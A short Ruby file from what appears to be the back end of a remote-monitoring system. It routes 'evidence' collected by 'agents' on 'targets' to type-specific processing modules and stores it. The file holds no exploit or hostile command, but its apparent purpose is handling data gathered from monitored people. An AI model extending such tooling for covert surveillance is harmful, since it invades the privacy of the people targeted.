require 'rcs-common/trace'

module RCS
module Worker

class SingleProcessor
  include RCS::Tracer
  require 'pp'

  def initialize(agent, target)
    @agent = agent
    @target = target
    @calls = []
  end

  def feed(evidence)
    # store agent instance in evidence (used when storing into db)
    evidence[:instance] = @agent['instance']
    evidence[:ident] = @agent['ident']

    # find correct processing module and extend evidence
    mod = "#{evidence[:type].to_s.capitalize}Processing"
    if RCS.const_defined? mod.to_sym
      evidence.extend eval(mod)
    else
      evidence.extend DefaultProcessing
    end

    evidence.process if evidence.respond_to? :process

    # override original type
    evidence[:type] = evidence.type if evidence.respond_to? :type
    ev_type = evidence[:type]

    evidence.store @agent, @target
  end
end

end # Worker
end # RCS